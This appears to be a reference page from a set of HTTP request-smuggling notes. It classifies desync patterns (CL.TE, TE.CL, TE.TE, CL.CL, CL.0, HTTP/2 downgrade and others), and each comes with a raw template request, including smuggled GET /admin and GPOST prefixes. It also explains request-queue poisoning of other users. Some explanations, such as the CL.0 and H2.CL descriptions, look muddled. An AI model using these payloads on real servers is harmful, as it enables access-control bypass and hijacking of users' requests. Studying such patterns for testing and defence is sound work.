# Desync Taxonomy — every disagreement pattern

## The model — who decides the body boundary

Every desync is two parsers disagreeing on **where one request ends and
the next begins**. The disagreement is always over the body boundary:
what front-end calls "end of request 1", back-end calls "start of
request 2" (or "still body").

The five primitives:

- **CL** — `Content-Length: N` — body is N bytes after headers
- **TE chunked** — `Transfer-Encoding: chunked` — body is 0-terminated
  chunks
- **TE chunked+obfuscated** — the TE header present but malformed —
  whether each parser accepts it varies
- **no length signal** — HTTP/1.0 style — body runs to connection close
- **HTTP/2 frame boundary** — DATA frame lengths — binary, not text

## CL.TE — front-end uses CL, back-end uses TE

```text
POST / HTTP/1.1
Host: t
Content-Length: 6
Transfer-Encoding: chunked

0

G
```

Front: body = 6 bytes (`0\r\n\r\nG`) → forwards. Back: reads `0` →
chunk end → `G` starts a new request → `GPOST` sits queued.

Classic CL.TE — the smuggled `G` poisons the NEXT request's prefix.

## TE.CL — front-end uses TE, back-end uses CL

```text
POST / HTTP/1.1
Host: t
Content-Length: 4
Transfer-Encoding: chunked

5c
GPOST / HTTP/1.1
Host: t
Content-Length: 15

x=1
0
```

Front: chunked — reads `5c` (92 bytes of chunk data which includes the
smuggled request) → forwards whole thing. Back: `Content-Length: 4` →
body = `5c\r\n` → the rest (`GPOST ...`) is a new request.

Classic TE.CL — the full second request arrives at the back-end.

## TE.TE — both use TE, disagree on the OBSCURED form

```text
POST / HTTP/1.1
Host: t
Content-Length: 4
Transfer-Encoding: chunked
Transfer-Encoding: cow          — obfuscated variant
```

One parser sees `chunked` and honors it; the other sees `cow` and
falls back to CL. Same disagreement as TE.CL but via obfuscation —
`obfuscation.md`.

## CL.CL — both use CL, disagree on WHICH CL

```text
POST / HTTP/1.1
Host: t
Content-Length: 4
Content-Length: 7
```

Two CL headers — RFC says reject, some stacks pick first, some pick
last, some merge. If front picks 4 and back picks 7 → desync.

## CL.0 — front reads CL, back ignores body (client-side desync)

```text
POST / HTTP/1.1
Host: t
Content-Length: 45

GET /admin HTTP/1.1
Host: t
```

Front honors CL=45 → waits/forwards 45 bytes. Back ignores the body
entirely on this method/route → reads `GET /admin` as the NEXT request —
the smuggled GET runs as the victim's next request → **client-side
desync** — `client-side-desync.md`.

## HTTP/2 → HTTP/1.1 downgrade — the h2→h1 family

```text
:method POST
:path /
:authority t
content-length 0
transfer-encoding chunked
```

Front speaks HTTP/2 (frame boundaries explicit) → translates to
HTTP/1.1 for the back-end → injects a `transfer-encoding: chunked`
header the back-end honors → the body the front measured by frames
is re-chunked on the back — desync via translation — `http2-smuggling.md`.

## H2.CL / H2.TE — the h2-front CL/TE disagreement

- **H2.CL** — front-end is HTTP/2, trusts the `content-length` header
  inside the h2 headers, back-end is HTTP/1.1 reading TE — downgrade
  makes the smuggle
- **H2.TE** — front-end is HTTP/2, back-end honors an injected TE
  header

## HTTP/1.0 no-length — the connection-close boundary

```text
POST / HTTP/1.0
Host: t

GET /admin HTTP/1.0
Host: t
```

HTTP/1.0 with no CL → body runs to connection close. A proxy that
upgrades to 1.1 or assumes no body → desync on the connection-close
boundary. Rare but real on old middleware.

## Expect-100-continue — the interim-response desync

```text
POST / HTTP/1.1
Host: t
Content-Length: 100
Expect: 100-continue
```

Front sends `100 Continue` → client sends the real 100-byte body →
but a middleware that auto-sends `100 Continue` early changes the
boundary math — the interim-response desync.

## Head-of-line — the queue-poison view

Every desync's practical form is **request-queue poisoning** — the
smuggled prefix lands in front of the NEXT victim's request:

```text
victim's GET / ... arrives
back-end sees: GPOST /victim's-path?...
→ the GPOST prefix executes, the victim's request is the body
```

`response-poisoning.md` — the victim's response goes back to the wrong
socket.

## The naming table — which is which

| Name | Front | Back | Trigger |
|---|---|---|---|
| CL.TE | CL | TE | CL < actual bytes |
| TE.CL | TE | CL | CL > chunked stop |
| TE.TE | TE-obfuscated | TE-obfuscated | different obfuscation acceptance |
| CL.CL | CL-A | CL-B | duplicate CL |
| CL.0 | CL | none | body ignored |
| H2.CL | h2-frame | CL | downgrade + h2 CL header |
| H2.TE | h2-frame | TE | downgrade + injected TE |

## The "which pair is live" — the differential matrix

Probe each pair — the pair that returns a DIFFERENT response is live —
`detection.md` — the differential is the oracle.
